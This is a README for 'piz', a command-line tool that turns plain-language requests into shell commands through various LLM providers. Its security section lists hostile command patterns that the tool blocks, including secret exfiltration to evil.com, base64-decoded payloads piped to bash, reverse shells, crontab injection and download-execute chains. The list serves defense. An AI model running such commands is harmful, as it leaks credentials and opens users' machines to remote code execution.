<h1 align="center">piz</h1>

<p align="center">
  <strong>Intelligent terminal command assistant</strong><br>
  Translate natural language to shell commands with AI
</p>

<p align="center">
  <a href="https://github.com/AriesOxO/piz/actions"><img src="https://github.com/AriesOxO/piz/workflows/CI/badge.svg" alt="CI"></a>
  <a href="https://github.com/AriesOxO/piz/releases"><img src="https://img.shields.io/github/v/release/AriesOxO/piz" alt="Release"></a>
  <a href="https://github.com/AriesOxO/piz/blob/main/LICENSE"><img src="https://img.shields.io/github/license/AriesOxO/piz" alt="License"></a>
</p>

<p align="center">
  <a href="./README.md">English</a> |
  <a href="./README_ZH.md">简体中文</a>
</p>

---

## What is piz?

**piz** solves one problem: you know *what* you want to do, but not the exact command. Describe it in plain language, and piz translates it into the right shell command for your OS and shell.

```
$ piz list all files larger than 100MB
  ➜ find . -size +100M -type f
  [Y] Execute  [n] Cancel  [e] Edit
```

## Features

- **Natural Language to Command** - Describe what you want, get the exact command
- **Multi-Backend LLM** - OpenAI, Claude, Gemini, Ollama + 12 OpenAI-compatible providers (DeepSeek, SiliconFlow, OpenRouter, Moonshot, Zhipu/GLM, Qianfan, DashScope, Mistral, Together, Minimax, BytePlus, and more)
- **Security Hardening** - Three-layer protection: prompt-level refusal for non-command input, injection detection (base64 payloads, env exfiltration, reverse shells, curl config attacks), and regex-based danger classification
- **Danger Detection** - Dual-layer: regex patterns + LLM classification. Dangerous commands always require explicit confirmation
- **Command Explain** - Break down any command into its components with `piz -e`
- **Command Fix** - Auto-diagnose and fix failed commands with `piz fix`, with auto-retry (up to 3 attempts)
- **Interactive Chat** - Multi-turn chat mode with context (`piz chat`), with `/help`, `/clear`, `/history` commands and persistent history
- **Multi-Candidate** - Generate multiple command options with `-n` and pick your preferred one
- **Local Cache** - SQLite cache with TTL + LRU eviction, max entries limit, repeated queries return instantly
- **Execution History** - Track all executed commands with `piz history`, searchable
- **Shell Completions** - Generate completions for bash, zsh, fish, and PowerShell
- **Pipe Mode** - Script-friendly output with `--pipe` for integration with other tools
- **Multi-Language UI** - Chinese, English, Japanese interface with localized security messages
- **Cross-Platform** - Windows (PowerShell/cmd), macOS, Linux (bash/zsh/fish)
- **Interactive Setup** - First-run wizard with provider presets, no manual config editing needed
- **NO_COLOR Support** - Respects the `NO_COLOR` environment variable
- **API Resilience** - Automatic retry with exponential backoff for 429/5xx errors

## Quick Start

### Install

**macOS / Linux (one-liner):**

```bash
curl -fsSL https://raw.githubusercontent.com/AriesOxO/piz/main/install.sh | bash
```

**Windows (PowerShell):**

```powershell
iwr -useb https://raw.githubusercontent.com/AriesOxO/piz/main/install.ps1 | iex
```

**Cargo (any platform):**

```bash
cargo install piz
```

**Manual download:**

Download binaries, `.msi` (Windows) or `.deb` (Debian/Ubuntu) from [Releases](https://github.com/AriesOxO/piz/releases).

| Platform | Downloads |
|----------|-----------|
| Windows x86_64 | `.msi` `.zip` |
| macOS x86_64 | `.tar.gz` |
| macOS ARM64 (Apple Silicon) | `.tar.gz` |
| Linux x86_64 | `.tar.gz` `.deb` |
| Linux ARM64 | `.tar.gz` |

### Setup

Run any command and the interactive setup wizard will start automatically:

```
$ piz list files
No configuration found. Let's set up piz for the first time.

  ⚙ piz configuration wizard

? Select language: 中文 / English / 日本語
? Select default LLM backend:
  > openai (DeepSeek, SiliconFlow, OpenRouter, ...)
    claude
    gemini (Google)
    ollama (local)
? Select API provider:
    OpenAI / DeepSeek / SiliconFlow / OpenRouter / Moonshot
    Zhipu-GLM / Qianfan / DashScope / Mistral / Together
    Minimax / BytePlus / Custom URL
? API base URL: https://api.siliconflow.cn
? API key: sk-xxxxx
? Model name: Qwen/Qwen3-8B
? Auto-execute safe commands without confirmation? Yes

  ✔ Config saved
```

Or manually: `piz config --init`

## Usage

### Translate natural language

```bash
piz show disk usage                    # → df -h
piz find all rust files modified today # → find . -name "*.rs" -mtime 0
piz compress the src folder            # → tar -czf src.tar.gz src/
```

### Multi-candidate mode

```bash
$ piz -n 3 find large files
? Select a command to execute:
> 1. find . -size +100M -type f — Find files larger than 100MB
  2. du -ah . | sort -rh | head -20 — Show top 20 largest files/dirs
  3. ls -lhRS | head -30 — List files sorted by size descending
```

### Explain a command

```bash
$ piz -e 'tar -czf archive.tar.gz src/'
📖 Command explanation:

  tar  — tape archive tool
  -c   — create a new archive
  -z   — compress with gzip
  -f   — specify output filename
  src/ — directory to archive
```

### Fix failed commands

```bash
$ npm install
→ EACCES: permission denied...

$ piz fix
🔧 Diagnosis: Permission denied writing to global node_modules
  - npm install
  + sudo npm install
```

The fix command now supports auto-retry: if the fixed command also fails, piz will attempt up to 3 rounds of diagnosis and repair.

### Interactive chat mode

```bash
$ piz chat
💬 interactive mode
Type your request, or 'exit'/'quit' to leave.

> list all running docker containers
  ➜ docker ps
  [Y] Execute  [n] Cancel  [e] Edit

> only show the names
  ➜ docker ps --format '{{.Names}}'
```

Chat mode supports special commands:
- `/help` — Show available commands
- `/clear` — Clear conversation history
- `/history` — View conversation history

### Execution history

```bash
$ piz history              # Show last 20 executed commands
$ piz history docker -l 10 # Search for "docker" in last 10 entries
```

### Shell completions

```bash
piz completions bash > ~/.bash_completion.d/piz   # Bash
piz completions zsh > ~/.zfunc/_piz                # Zsh
piz completions fish > ~/.config/fish/completions/piz.fish  # Fish
piz completions powershell > piz.ps1               # PowerShell
```

### Pipe mode

```bash
# Output only the command, no UI — useful for scripting
piz --pipe list all rust files   # → find . -name "*.rs"
eval $(echo "list files" | piz --pipe)  # Execute directly
```

### Configuration management

```bash
piz config --init        # Run setup wizard
piz config --show        # Show current config (API keys masked)
piz config --reset       # Delete config and start over
```

### Other options

```bash
piz --backend ollama list files    # Use specific backend
piz --backend gemini show memory   # Use Google Gemini
piz --no-cache show memory         # Skip cache
piz --verbose list files           # Debug: show prompts and LLM responses
piz -n 3 list files                # Generate 3 candidate commands
piz clear-cache                    # Clear all cached commands
piz --version                      # Show version
```

## Supported Providers

### Native backends

| Backend | Config section | Notes |
|---------|---------------|-------|
| **OpenAI** | `[openai]` | Also supports any OpenAI-compatible API via `base_url` |
| **Claude** | `[claude]` | Anthropic Messages API, custom `base_url` supported |
| **Gemini** | `[gemini]` | Google Generative AI native API |
| **Ollama** | `[ollama]` | Local models, no API key needed |

### OpenAI-compatible providers (via `[openai]` with custom `base_url`)

<details>
<summary>Click to expand all 12 providers</summary>

| Provider | base_url | Default model |
|----------|----------|---------------|
| OpenAI | `https://api.openai.com` | gpt-4o-mini |
| DeepSeek | `https://api.deepseek.com` | deepseek-chat |
| SiliconFlow | `https://api.siliconflow.cn` | Qwen/Qwen3-8B |
| OpenRouter | `https://openrouter.ai/api/v1` | auto |
| Moonshot/Kimi | `https://api.moonshot.cn` | moonshot-v1-8k |
| Zhipu/GLM | `https://open.bigmodel.cn/api/paas/v4` | glm-4-flash |
| Qianfan/Baidu | `https://qianfan.baidubce.com/v2` | deepseek-v3 |
| DashScope/Alibaba | `https://dashscope.aliyuncs.com/compatible-mode/v1` | qwen-plus |
| Mistral | `https://api.mistral.ai/v1` | mistral-small-latest |
| Together | `https://api.together.xyz/v1` | Meta-Llama-3-8B |
| Minimax | `https://api.minimax.io/v1` | MiniMax-M1 |
| BytePlus | `https://api.byteplus.volcengineapi.com/v1` | doubao-1.5-pro-32k |

</details>

## Configuration

Config file: `~/.piz/config.toml`

```toml
default_backend = "openai"
cache_ttl_hours = 168          # Cache TTL (7 days)
cache_max_entries = 1000       # Maximum cache entries (LRU eviction)
auto_confirm_safe = true       # Auto-execute safe commands
language = "zh"                # UI language: zh / en / ja
chat_history_size = 20         # Max chat history messages

[openai]
api_key = "sk-your-key"
model = "gpt-4o-mini"
# base_url = "https://api.openai.com"

# [claude]
# api_key = "sk-ant-xxx"
# model = "claude-sonnet-4-20250514"

# [gemini]
# api_key = "your-gemini-key"
# model = "gemini-2.5-flash"

# [ollama]
# host = "http://localhost:11434"
# model = "llama3"
```

### Provider config examples

<details>
<summary>DeepSeek</summary>

```toml
[openai]
api_key = "sk-your-deepseek-key"
model = "deepseek-chat"
base_url = "https://api.deepseek.com"
```
</details>

<details>
<summary>SiliconFlow</summary>

```toml
[openai]
api_key = "sk-your-key"
model = "Qwen/Qwen3-8B"
base_url = "https://api.siliconflow.cn"
```
</details>

<details>
<summary>Google Gemini</summary>

```toml
[gemini]
api_key = "your-gemini-key"
model = "gemini-2.5-flash"
```
</details>

<details>
<summary>OpenRouter</summary>

```toml
[openai]
api_key = "sk-or-your-key"
model = "auto"
base_url = "https://openrouter.ai/api/v1"
```
</details>

<details>
<summary>Moonshot / Kimi</summary>

```toml
[openai]
api_key = "sk-your-key"
model = "moonshot-v1-8k"
base_url = "https://api.moonshot.cn"
```
</details>

<details>
<summary>Zhipu / GLM</summary>

```toml
[openai]
api_key = "your-key"
model = "glm-4-flash"
base_url = "https://open.bigmodel.cn/api/paas/v4"
```
</details>

## Security

piz implements three layers of security:

### 1. Prompt-level refusal
Non-command inputs (greetings, chitchat, prompt injection attempts) are rejected by the LLM with a clear message instead of generating a command.

### 2. Injection detection (local, no LLM)
Commands are scanned for malicious patterns before execution:
- Environment variable exfiltration (`curl evil.com/$API_KEY`)
- Encoded payloads (`echo ... | base64 -d | bash`)
- Reverse shells (`python -e 'import socket...'`)
- Shell config overwrites (`> ~/.bashrc`)
- Silent crontab injection (`| crontab -`)
- curl config file attacks (`curl -K malicious.conf`)
- Download-execute chains (`wget ... && chmod +x && ./`)
- Dangerous find/xargs patterns (`find -delete`, `xargs rm`)

Matched commands are **blocked** and cannot be executed. Injection messages are localized (zh/en/ja).

Cached commands are also re-validated on retrieval — poisoned cache entries are automatically purged.

### 3. Danger classification

| Level | Behavior | Example |
|-------|----------|---------|
| **Safe** | Auto-execute (if configured) | `ls`, `df -h`, `git status` |
| **Warning** | Prompt for confirmation | `sudo apt install`, `chmod 755`, `git push` |
| **Dangerous** | Red warning + explicit confirmation (cannot skip) | `rm -rf /`, `mkfs`, `DROP TABLE` |

## Architecture

```
piz/
├── src/
│   ├── main.rs          # Entry point, CLI dispatch, response parsing, multi-candidate selection
│   ├── cli.rs           # clap argument definitions (with clap_complete)
│   ├── config.rs        # TOML config + interactive setup wizard (12 provider presets)
│   ├── context.rs       # System context collection (OS, shell, cwd, arch, git, package manager)
│   ├── i18n.rs          # Multi-language translations (zh/en/ja) including injection messages
│   ├── llm/
│   │   ├── mod.rs       # LlmBackend trait + factory + retry/backoff utilities
│   │   ├── prompt.rs    # Prompt templates with security rules, few-shot examples, multi-candidate
│   │   ├── openai.rs    # OpenAI-compatible adapter (with retry)
│   │   ├── claude.rs    # Claude adapter (with retry)
│   │   ├── gemini.rs    # Google Gemini adapter (with retry)
│   │   └── ollama.rs    # Ollama adapter (with retry)
│   ├── cache.rs         # SQLite cache with SHA256 keys, TTL, LRU eviction + execution history
│   ├── danger.rs        # Regex danger detection + injection scanner (InjectionReason enum)
│   ├── executor.rs      # User confirmation + command execution
│   ├── explain.rs       # Command explain mode
│   ├── fix.rs           # Command fix mode + auto-fix retry loop
│   ├── chat.rs          # Interactive chat mode with slash commands + persistent history
│   ├── history.rs       # Shell history reader
│   └── ui.rs            # Terminal output formatting (spinner, diff, colors)
├── tests/
│   └── integration.rs   # Integration tests
├── install.sh           # macOS/Linux installer
└── install.ps1          # Windows installer
```

## Building from Source

```bash
# Prerequisites: Rust 1.70+
git clone https://github.com/AriesOxO/piz.git
cd piz

cargo build --release      # Build
cargo test                 # Run tests (158)
cargo install --path .     # Install to PATH
```

## Environment Variables

| Variable | Description |
|----------|-------------|
| `NO_COLOR` | Set to any value to disable colored output |

## Contributing

Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
